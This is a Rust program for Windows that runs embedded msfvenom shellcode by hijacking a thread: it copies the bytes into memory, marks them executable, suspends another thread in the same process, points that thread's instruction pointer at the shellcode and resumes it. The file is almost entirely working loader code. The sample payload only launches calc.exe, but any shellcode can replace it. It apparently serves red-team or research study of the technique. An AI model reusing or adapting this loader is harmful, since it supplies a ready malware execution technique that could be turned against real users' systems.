use std::ptr::copy_nonoverlapping;
use windows::core::{Error, Result};
use windows::Win32::{
    Foundation::{HANDLE, E_FAIL}, 
    System::{
        Memory::*,
        Threading::*,
        Diagnostics::{
            ToolHelp::*,
            Debug::{
                GetThreadContext, SetThreadContext, 
                CONTEXT, CONTEXT_ALL_AMD64
            },
        },
    }, 
};

// https://github.com/microsoft/win32metadata/issues/1044
#[repr(align(16))]
#[derive(Default)]
struct AlignedContext {
    ctx: CONTEXT
}

fn main() -> Result<()> {
    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    let shellcode: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];

    unsafe {
        // If you want to create a thread and then steal it, you can create it like this
        //
        // let hthread = CreateThread(
        //     None,
        //     0,
        //     Some(function),
        //     None,
        //     THREAD_CREATION_FLAGS(CREATE_SUSPENDED.0),
        //     None
        // )?;

        // Locate a thread in the current process (excluding self)
        println!("[+] Searching for the thread handle ");
        let hthread = find_thread()?;

        // Allocate RW memory in the current process for shellcode
        let address = VirtualAlloc(None, shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if address.is_null() {
            return Err(Error::new(E_FAIL, "VirtualAlloc Failed".into()));
        }

        // Copy the shellcode into the allocated memory
        println!("[+] Copying the shellcode");
        copy_nonoverlapping(shellcode.as_ptr().cast(), address, shellcode.len());

        // Make the allocated memory executable
        let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(address, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut oldprotect)?;

        let mut ctx_thread = AlignedContext {
            ctx: CONTEXT {
                ContextFlags: CONTEXT_ALL_AMD64,
                ..Default::default()
            },
        };

        // Suspend the thread to safely alter execution flow
        SuspendThread(hthread);

        // Retrieve the current thread context
        println!("[+] Retrieving thread context");
        GetThreadContext(hthread, &mut ctx_thread.ctx)?;

        ctx_thread.ctx.Rip = address as u64;

        // Apply the modified thread context with new RIP
        println!("[+] Setting the thread context");
        SetThreadContext(hthread,  &ctx_thread.ctx)?;

        // Resume the hijacked thread and trigger execution
        println!("[+] Thread Executed!");
        ResumeThread(hthread);
        WaitForSingleObject(hthread, INFINITE);
    }

    Ok(())
}

/// Finds and opens a thread belonging to the specified process ID (PID).
///
/// # Returns
///
/// * `Ok(HANDLE)` - A handle to the found thread.
/// * `Err` - If no thread for the given PID is found or cannot be opened.
fn find_thread() -> Result<HANDLE> {
    unsafe {
        let pid = GetCurrentProcessId();
        let tid = GetCurrentThreadId();
        let hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)?;
        let mut thr = THREADENTRY32 {
            dwSize: size_of::<THREADENTRY32>() as u32,
            ..Default::default()
        };
    
        if Thread32First(hsnap, &mut thr).is_ok() {
            loop {
                if thr.th32OwnerProcessID == pid && thr.th32ThreadID != tid {
                    let h_thread = OpenThread(THREAD_ALL_ACCESS, false, thr.th32ThreadID)?;
                    return Ok(h_thread);
                }
    
                if Thread32Next(hsnap, &mut thr).is_err() {
                    break;
                }
            }
        }
    }

    Err(Error::new(E_FAIL, "Thread not found".into()))
}

// Example of a function to create a thread
// unsafe extern "system" fn function(_param: *mut std::ffi::c_void) -> u32 {
//     let a = 1 + 1;
//     return a;
// }
